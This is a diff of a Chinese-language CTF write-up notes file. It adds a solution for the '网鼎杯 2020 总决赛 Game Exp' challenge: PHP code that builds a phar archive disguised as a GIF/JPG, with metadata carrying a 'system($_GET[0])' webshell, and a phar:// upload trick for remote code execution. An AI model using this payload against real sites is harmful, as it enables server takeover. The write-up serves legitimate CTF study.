@@ -43,8 +43,38 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Cal
 
 
 
-### [b01lers2020]Space Noodles
+### [网鼎杯 2020 总决赛]Game Exp
+#phar
+注意到了俩处命令执行,但是没想到是`file_exist`反序列化
 
+```php
+        $filename = $username.".".$extension;
+        if (file_exists($filename))
+        {
+            echo "<script>alert('文件已经存在');</script>";
+        }
+```
+
+```php
+<?php
+class AnyClass{
+    var $output = 'echo "ok";';
+}
+ 
+$o = new AnyClass();
+$o->output = 'system($_GET[0]);';
+ 
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
+$phar->setMetadata($o); //将自定义meta-data存入manifest
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+$phar->stopBuffering();
+```
+rename为phar.jpg
+
+上传后文件名变为 `username+jpg`
+再次上传文件,文件名修改为`phar:///var/www/html/leijk`即可rce
 
 
 
